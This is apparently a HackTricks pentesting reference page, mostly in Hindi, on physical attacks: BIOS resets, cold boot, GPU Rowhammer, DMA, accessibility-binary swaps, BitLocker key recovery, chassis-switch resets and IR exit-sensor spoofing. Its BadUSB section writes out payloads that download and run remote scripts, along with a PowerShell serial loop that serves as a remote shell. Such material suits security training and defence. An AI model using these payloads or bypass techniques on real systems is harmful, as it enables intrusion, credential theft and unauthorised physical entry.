# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

पुराने PC firmware की settings को CMOS battery disconnect करके या दस्तावेज़ में बताए गए clear-CMOS jumper का उपयोग करके reset किया जा सकता है। इसके लिए power बंद रखने की आवश्यक अवधि motherboard पर निर्भर करती है। आधुनिक UEFI passwords या keys nonvolatile flash, embedded controller या security device में हो सकते हैं, इसलिए battery हटाने के बाद भी बने रह सकते हैं। Pins को short करने से पहले motherboard या service manual देखें; इस प्रक्रिया से TPM measurements अमान्य हो सकते हैं और disk-encryption recovery शुरू हो सकती है।

पुराने x86 systems पर, **killCMOS** और **CmosPwd** जैसे tools bootable environment से CMOS-backed settings की जाँच या उनमें बदलाव कर सकते हैं। CmosPwd पुराने BIOS families के दस्तावेज़ीकृत समूह के password formats पहचानता है और CMOS state का backup, restore या erase/kill कर सकता है; इसके प्रकाशित builds पुराने DOS/Windows, Linux, FreeBSD और NetBSD environments के लिए हैं।<sup>[[18]](#references)</sup> ये utilities सामान्य UEFI password removers नहीं हैं और इनके लिए hardware/firmware तक पर्याप्त access आवश्यक है।

कुछ laptop firmware में कई असफल password attempts के बाद vendor-specific challenge code दिखता है। [bios-pw.org](https://bios-pw.org) जैसे databases कुछ models के लिए पुराने vendor recovery passwords निकाल सकते हैं, लेकिन कई systems में ऐसा lockout होता है जिसके लिए कोई password निकाला नहीं जा सकता। बनाए गए किसी भी password को model-specific मानें और permanent attempt counters को पूरी तरह समाप्त करने से बचें।

### UEFI Security

आधुनिक **UEFI** systems के लिए, CHIPSEC से Secure Boot variable protections का audit किया जा सकता है। नीचे दिए गए non-modifying check से शुरुआत करें; वैकल्पिक `-a modify` mode जानबूझकर variables को corrupt करने की कोशिश करता है और इसका उपयोग केवल ऐसे lab system पर करें जिसे recover किया जा सके। CHIPSEC स्वयं चेतावनी देता है कि इसका privileged driver और low-level hardware access production endpoints के लिए उपयुक्त नहीं हैं।<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analysis and Cold Boot Attacks

DRAM में refresh बंद होने पर हर bit तुरंत नष्ट नहीं होता। डेटा के क्षय की दर module की तकनीक और तापमान के अनुसार काफी बदलती है; ठंडा करने से उपयोगी डेटा, बिना ठंडा किए power cycle करने की तुलना में, कहीं अधिक समय तक सुरक्षित रह सकता है। Cold-boot attack में सिस्टम को तेज़ी से reboot करके एक छोटे acquisition environment में लाया जाता है या ठंडे किए गए module को दूसरे सिस्टम में लगाया जाता है, raw memory capture की जाती है और bit decay के बावजूद cryptographic keys को फिर से बनाया जाता है। Disk-copy utility अपने-आप physical-memory imager नहीं होती, और Volatility capture का विश्लेषण करता है, उसे acquire नहीं; platform के अनुकूल, validated acquisition tool का उपयोग करें।<sup>[[12]](#references)</sup>

---

## Page Tables पर GPU Rowhammer

आधुनिक GPU Rowhammer attacks तब अधिक उपयोगी हो जाते हैं, जब वे सामान्य buffers के बजाय **GPU virtual-memory metadata** को target करते हैं। **GDDR6 NVIDIA Ampere GPUs** पर हालिया शोध दिखाता है कि unprivileged CUDA code चलाने वाला attacker GPU-विशिष्ट hammering patterns बना सकता है, paging structures को कमजोर rows में रखने के लिए **memory massaging** का इस्तेमाल कर सकता है, और फिर **last-level page table** या intermediate **page directory** में bits flip कर सकता है। एक translation entry corrupt होते ही attacker **arbitrary GPU memory read/write** हासिल कर सकता है और फिर host compromise तक पहुंच सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 में **hammerable rows की पहचान** करें और in-DRAM mitigations को bypass करने वाले refresh-aware / non-uniform hammering patterns बनाएं।
2. **GPU allocations को massage** करें, ताकि driver page-translation structures को default protected pool में रखने के बजाय hammerable physical locations में रखे। व्यवहार में, इसका अर्थ low-memory page-table region को भर देना और नियंत्रित strides के साथ बड़े sparse UVM mappings बनाना हो सकता है।
3. Page-table / page-directory entry के भीतर **PFN** या aperture से जुड़े bits जैसे **translation metadata** को flip करें, ताकि attacker-controlled virtual page, page-table pages, arbitrary GPU memory या host-visible system mappings पर resolve हो।
4. Forged mapping का फिर से उपयोग करके अतिरिक्त translation entries को rewrite करें और GPU contexts में **arbitrary GPU memory read/write** तक पहुंचें।

### Host Pivot और Mitigations

- **IOMMU disabled** होने पर forged system-aperture mappings GPU को मनमानी **host physical memory** तक पहुंच दे सकती हैं, जिससे GPU primitive पूरे host compromise में बदल जाता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** last-level page-table entries को target करता है, जबकि **GeForge** दिखाता है कि page-directory level को corrupt करना आसान हो सकता है, क्योंकि एक bit flip बड़े translation subtree को दूसरी जगह भेज सकता है। केवल एक paging layer को security-critical न मानें।<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** अब भी महत्वपूर्ण है, क्योंकि यह GDDRHammer/GeForge द्वारा इस्तेमाल किए जाने वाले सीधे arbitrary-host-memory path को रोकता है, लेकिन यह **पूर्ण mitigation नहीं है**। **GPUBreach** दूसरे चरण का pivot दिखाता है, जिसमें attacker GPU-writable, driver-owned CPU buffers को corrupt करता है और फिर NVIDIA driver की memory-safety bugs को trigger करके kernel write primitive तथा **root shell** हासिल करता है, यहां तक कि IOMMU enabled होने पर भी।<sup>[[3]](#references)</sup>
- Supported workstation/server GPUs पर **System-level ECC** एक व्यावहारिक hardening कदम है। ECC के बिना consumer GPUs में सुरक्षा की कमज़ोरियां अधिक होती हैं।<sup>[[4]](#references)</sup>
- ये attacks केवल सैद्धांतिक नहीं हैं: **GeForge** ने RTX 3060 पर **1,171** और RTX A6000 पर **202** bit flips की सूचना दी, जो host privilege escalation की काम करने वाली chain बनाने के लिए पर्याप्त थे।<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

ऐसी offline UEFI IFR/NVRAM patching के लिए, जो pre-boot IOMMU enforcement को downgrade करके Windows DMA chain सक्षम कर सकती है, देखें:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** FireWire और शुरुआती Thunderbolt configurations जैसे interfaces पर **DMA-based memory acquisition and patching** दिखाता है, जिसमें पुराने login-bypass signatures भी शामिल हैं। यह सिर्फ़ “Windows 10 के विरुद्ध अप्रभावी” नहीं है: exploitability interface, target build, IOMMU policy, lock state और Windows Kernel DMA Protection के supported और enabled होने पर निर्भर करती है। Windows 10 version 1803 और बाद के संस्करणों ने compatible platforms पर Kernel DMA Protection पेश किया, जिससे attack surface में काफी बदलाव आया।<sup>[[13]](#references)[[14]](#references)</sup>

---

## सिस्टम तक पहुंच के लिए Live CD/USB

बिना encryption वाले या पहले से unlocked Windows volume पर, offline environment **sethc.exe** या **Utilman.exe** जैसी accessibility binaries को **cmd.exe** से बदल सकता है। इससे संबंधित logon-screen shortcut चलने पर SYSTEM command prompt मिलता है। **chntpw** जैसे tools स्थानीय SAM account data को edit कर सकते हैं। ये तरीके locked BitLocker volume को bypass नहीं करते और DPAPI/EFS से सुरक्षित credentials को नुकसान पहुंचा सकते हैं; forensic copies और backups सुरक्षित रखें।

**Kon-Boot** समर्थित Windows/macOS configurations के लिए commercial boot-time authentication-bypass tool है। इसकी compatibility OS, firmware mode, Secure Boot और disk-encryption setup पर निर्भर करती है; यह BitLocker-locked volume को decrypt नहीं करता।<sup>[[10]](#references)</sup>

---

## Windows Security Features को संभालना

### Boot और Recovery Shortcuts

- **Delete/Supr**, F2, F10 या कोई अन्य vendor key firmware setup खोल सकती है।
- **F8** केवल उन configurations में legacy Windows advanced boot options खोलता है जहां यह विकल्प अब भी enabled है; मौजूदा recovery entry का तरीका अलग-अलग हो सकता है।
- कुछ configurations में **Shift** दबाए रखने से Windows का automatic logon रुक सकता है, हालांकि policy/registry settings इस व्यवहार को disable कर सकती हैं।<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** और Teensy boards जैसे devices trusted HID keyboards के रूप में enumerate होकर पहले से तय keystrokes inject कर सकते हैं। Payload को शुरुआत में logged-on session के privileges और desktop access मिलते हैं; फिर भी UAC prompts, screen locking, keyboard layout, timing और endpoint USB policy उसे सीमित करते हैं।<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator या backup privileges से shadow copy बनाई जा सकती है या registry hives save किए जा सकते हैं, ताकि **SAM** और **SYSTEM** जैसी locked files acquire की जा सकें। यह post-compromise collection technique है, privilege bypass नहीं; इसे `diskshadow`/VSS और registry-hive export events के साथ correlate करना चाहिए।

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** जैसे ESP32-S3 आधारित implants USB-A→USB-C या USB-C↔USB-C cables के भीतर छिपे रहते हैं, केवल USB keyboard के रूप में enumerate होते हैं और अपना C2 stack Wi-Fi पर उपलब्ध कराते हैं। Operator को बस victim host से cable को power देना होता है, `Evil Crow Cable Wind` नाम और `123456789` password वाला hotspot बनाना होता है, और embedded HTTP interface तक पहुंचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या उसके DHCP address) पर जाना होता है।<sup>[[8]](#references)</sup>
- Browser UI में *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* और *Config* के tabs होते हैं। Stored payloads को OS के अनुसार tag किया जाता है, keyboard layouts को चलते-चलते बदला जा सकता है और VID/PID strings को ज्ञात peripherals जैसा दिखाने के लिए बदला जा सकता है।
- चूंकि C2 cable के भीतर होता है, फोन से payloads तैयार किए जा सकते हैं, execution trigger किया जा सकता है और Wi-Fi credentials manage किए जा सकते हैं—इसके लिए संगठन के network का उपयोग नहीं करना पड़ता। कम dwell-time वाले physical intrusions में यह उपयोगी है।

### OS-aware AutoExec payloads

- AutoExec rules एक या अधिक payloads को USB enumeration के तुरंत बाद चलने के लिए bind करते हैं। Implant हल्की OS fingerprinting करता है और मेल खाती script चुनता है।
- उदाहरण workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`।
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) या `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`।
- Execution unattended होने के कारण, charging cable को बदलने भर से logged-on user context में “plug-and-pwn” initial access मिल सकता है।

### Wi-Fi TCP पर HID-bootstrapped remote shell

1. **Keystroke bootstrap:** एक stored payload console खोलता है और ऐसा loop paste करता है जो नए USB serial device पर आने वाली हर चीज़ को execute करता है। Windows का एक न्यूनतम variant है:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant USB CDC channel को खुला रखता है, जबकि उसका ESP32-S3 ऑपरेटर को वापस TCP client (Python script, Android APK या desktop executable) लॉन्च करता है। TCP session में टाइप किए गए सभी bytes ऊपर दिए गए serial loop में भेजे जाते हैं, जिससे air-gapped hosts पर भी remote command execution संभव हो जाता है। Output सीमित होता है, इसलिए ऑपरेटर आमतौर पर blind commands (account creation, अतिरिक्त tooling को stage करना आदि) चलाते हैं।

### HTTP OTA update surface

- Documented Evil Crow Cable Wind interface `/update` पर unauthenticated firmware-update endpoint उपलब्ध कराता है:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operators engagement के बीच में ही features को hot-swap कर सकते हैं (जैसे, USB Army Knife firmware flash करना), बिना cable खोले। इससे implant, target host में plugged रहते हुए नई capabilities पर pivot कर सकता है।

## BitLocker Encryption को Bypass करना

Live या हाल ही में चलाए गए system का अधिकृत forensic acquisition करते समय, volume unlocked होने पर उसमें BitLocker volume master key या उससे संबंधित key material मौजूद हो सकता है। Elcomsoft Forensic Disk Decryptor और Passware Kit Forensic जैसे commercial tools, समर्थित memory images, hibernation files या crash dumps में खोज कर सकते हैं, लेकिन सफलता की गारंटी नहीं है। BitLocker enabled होने पर आधुनिक Windows crash dumps को भी encrypt करता है, और stored 48-digit recovery password, in-memory volume key से अलग artifact है।<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key जोड़ने के लिए Social Engineering

यदि कोई attacker किसी administrator को BitLocker-management commands चलाने के लिए राज़ी कर ले, तो वह recovery-password, external-key या कोई अन्य protector जोड़कर उसे capture कर सकता है। Recovery password, शून्यों की मनमानी string नहीं हो सकता: BitLocker numerical recovery passwords का format मान्य 48-digit होना चाहिए। अधिकृत administration के लिए संबंधित syntax है `manage-bde -protectors -add C: -recoverypassword`; जोड़े गए protectors की सूची `manage-bde -protectors -get C:` से देखें। Protector जोड़े जाने की निगरानी करें और सुनिश्चित करें कि नया recovery material केवल स्वीकृत locations पर escrow किया जाए।<sup>[[16]](#references)</sup>

---

## BIOS को Factory-Reset करने के लिए Chassis Intrusion / Maintenance Switches का Exploitation

कई आधुनिक laptops और छोटे form-factor desktops में **chassis-intrusion switch** होता है, जिसकी निगरानी Embedded Controller (EC) और BIOS/UEFI firmware करता है। इस switch का मुख्य उद्देश्य device खोले जाने पर alert देना है, लेकिन कुछ vendors एक **undocumented recovery shortcut** लागू करते हैं, जो switch को किसी खास pattern में toggle करने पर trigger होता है।<sup>[[5]](#references)[[6]](#references)</sup>

### Attack कैसे काम करता है

1. Switch, EC के **GPIO interrupt** से जुड़ा होता है।
2. EC पर चल रहा firmware, **presses के समय और संख्या** का हिसाब रखता है।
3. जब एक hard-coded pattern पहचाना जाता है, तो EC एक *mainboard-reset* routine चलाता है, जो **system NVRAM/CMOS की सामग्री मिटा देता है**।
4. अगले boot पर, प्रभावित models firmware की reset state load करते हैं। Vendor और revision के आधार पर, साफ़ की गई state में supervisor password, custom boot settings या enrolled Secure Boot keys शामिल हो सकती हैं; TPM state और disk-encryption पर पड़ने वाले प्रभावों का अलग से आकलन करना होगा।

> Firmware reset से external-boot options वापस चालू हो सकते हैं, लेकिन इससे storage **decrypt नहीं होता**। TPM/firmware में बदलाव के बाद BitLocker या कोई अन्य full-disk encryption system recovery की मांग कर सकता है और फिर भी recovery key के बिना internal drive को सुरक्षित रख सकता है।<sup>[[16]](#references)</sup>

### वास्तविक उदाहरण – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) के लिए recovery shortcut यह है:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

दसवें चक्र के बाद EC एक फ़्लैग सेट करता है, जो BIOS को अगले रीबूट पर NVRAM मिटाने का निर्देश देता है। पूरी प्रक्रिया में लगभग 40 सेकंड लगते हैं और इसके लिए **सिर्फ़ एक स्क्रूड्राइवर** चाहिए।<sup>[[5]](#references)</sup>

### सामान्य Exploitation प्रक्रिया

1. लक्ष्य को पावर-ऑन करें या सस्पेंड से फिर शुरू करें, ताकि EC चल रहा हो।
2. नीचे का कवर हटाकर intrusion/maintenance switch तक पहुँचें।
3. विक्रेता-विशिष्ट toggle pattern दोहराएँ (दस्तावेज़, फ़ोरम देखें या EC firmware को reverse-engineer करें)।
4. डिवाइस को फिर से जोड़कर रीबूट करें, फिर जाँचें कि कौन-सी firmware settings और credentials वास्तव में बदले।
5. यदि अधिकृत हो और external boot उपलब्ध हो, तो किसी नियंत्रित live image से बूट करें। जब internal volume वैध रूप से unlock हो जाए (या वह कभी encrypted न रहा हो), तो live environment credentials और data हासिल कर सकता है या EFI System Partition की जाँच कर सकता है। उस partition में बदलाव करके EFI implant इंस्टॉल करना स्थायी और अत्यंत घुसपैठ वाला कदम है, और यह Secure Boot, measured boot, firmware write protection तथा endpoint monitoring से सीमित रहता है। Encrypted storage उसकी key या recovery material के बिना पहुँच से बाहर रहता है।

### पहचान और बचाव

* OS management console में chassis-intrusion events लॉग करें और उन्हें अप्रत्याशित BIOS resets से मिलाकर देखें।
* खोलने का पता लगाने के लिए स्क्रू/कवर पर **tamper-evident seals** लगाएँ।
* डिवाइस **भौतिक रूप से नियंत्रित क्षेत्रों** में रखें; मानकर चलें कि भौतिक पहुँच का अर्थ पूर्ण compromise है।
* जहाँ उपलब्ध हो, विक्रेता का “maintenance switch reset” फ़ीचर बंद करें या NVRAM resets के लिए अतिरिक्त cryptographic authorisation आवश्यक करें।

---

## No-Touch Exit Sensors के विरुद्ध गुप्त IR Injection

### Sensor की विशेषताएँ
- बाज़ार में उपलब्ध “wave-to-exit” sensors में near-IR LED emitter के साथ TV-remote जैसे receiver module होते हैं, जो सही carrier (लगभग 30 kHz) के कई pulses (~4–10) मिलने के बाद ही logic high रिपोर्ट करते हैं।<sup>[[7]](#references)</sup>
- एक plastic shroud emitter और receiver को सीधे एक-दूसरे की ओर देखने से रोकता है, इसलिए controller मानता है कि मान्य carrier पास की किसी सतह से परावर्तित होकर आया है और door strike खोलने के लिए relay सक्रिय करता है।
- Controller को लक्ष्य मौजूद होने का विश्वास हो जाने पर वह अक्सर outbound modulation envelope बदल देता है, लेकिन receiver filtered carrier से मेल खाने वाले किसी भी burst को स्वीकार करता रहता है।

### Attack Workflow
1. **Emission profile कैप्चर करें** – controller pins के बीच logic analyser लगाकर pre-detection और post-detection, दोनों waveforms रिकॉर्ड करें, जो internal IR LED को चलाते हैं।
2. **सिर्फ़ “post-detection” waveform replay करें** – stock emitter हटाएँ/अनदेखा करें और शुरू से ही पहले से-triggered pattern के साथ external IR LED चलाएँ। चूँकि receiver केवल pulse count/frequency देखता है, वह spoofed carrier को असली reflection मानकर relay line सक्रिय कर देता है।
3. **Transmission को नियंत्रित करें** – carrier को तय bursts में प्रसारित करें (उदाहरण के लिए, कुछ दसियों milliseconds चालू और लगभग उतनी ही देर बंद), ताकि receiver का AGC या interference-handling logic saturate किए बिना न्यूनतम pulse count पूरा हो जाए। लगातार emission से sensor जल्द ही असंवेदनशील हो जाता है और relay सक्रिय होना बंद कर देता है।

### लंबी दूरी से परावर्तित Injection
- Bench LED की जगह high-power IR diode, MOSFET driver और focusing optics लगाने से लगभग 6 m दूर से भरोसेमंद triggering संभव है।
- हमलावर को receiver aperture तक line-of-sight की ज़रूरत नहीं होती; beam को काँच के पार दिखाई देने वाली अंदरूनी दीवारों, shelves या door frames पर निशाना बनाने से परावर्तित ऊर्जा लगभग 30° field of view में प्रवेश करती है और पास से हाथ हिलाने जैसी लगती है।
- चूँकि receivers कमज़ोर reflections के लिए बने होते हैं, इसलिए कहीं अधिक शक्तिशाली बाहरी beam कई सतहों से टकराकर भी detection threshold से ऊपर रह सकती है।

### हथियारबंद Attack Torch
- Driver को व्यावसायिक flashlight के अंदर लगाने से यह उपकरण आम नज़र आता है। दिखाई देने वाली LED को receiver के band से मेल खाने वाली high-power IR LED से बदलें, लगभग 30 kHz bursts बनाने के लिए ATtiny412 (या समान MCU) जोड़ें और LED current sink करने के लिए MOSFET इस्तेमाल करें।
- Telescopic zoom lens beam को लंबी दूरी और सटीकता के लिए संकरा करता है, जबकि MCU से नियंत्रित vibration motor बिना दिखाई देने वाली रोशनी निकाले, modulation सक्रिय होने की haptic पुष्टि देता है।
- कई संग्रहीत modulation patterns (carrier frequencies और envelopes में थोड़ा अंतर) के बीच बदलते रहने से अलग-अलग rebranded sensor families के साथ compatibility बढ़ती है। इससे ऑपरेटर परावर्तक सतहों पर beam घुमा सकता है, जब तक relay की क्लिक सुनाई न दे और दरवाज़ा न खुल जाए।

---

## References

- [1] [GDDRHammer: DRAM पंक्तियों को बड़े पैमाने पर बाधित करना — आधुनिक GPUs से Cross-Component Rowhammer हमले](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: मौज-मस्ती और फ़ायदे के लिए GPU Page Tables बनाने हेतु GDDR Memory पर Hammering](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer का उपयोग करके GPUs पर Privilege Escalation हमले](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - सुरक्षा सूचना: Rowhammer - जुलाई 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. यहाँ दबाकर pwn करें”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset गाइड](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “नहींऽऽऽ, छुएँ नहीं! – गुप्त IR Torch से IR No-Touch Exit Sensors को bypass करना”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “लगाएँ, चलाएँ, pwn करें: Evil Crow Cable Wind से hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chips पर Rowhammer हमला](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot के आधिकारिक दस्तावेज़ और compatibility जानकारी](https://kon-boot.com/)
- [11] [CHIPSEC दस्तावेज़ - Secure Boot variable सुरक्षा](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [जब तक हम याद रखें: Encryption Keys पर Cold Boot हमले](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA के ज़रिए physical memory में बदलाव](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA सुरक्षा](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky दस्तावेज़](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker संचालन गाइड](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift दबाए रखने और automatic logon के व्यवहार पर](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd दस्तावेज़ और डाउनलोड](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
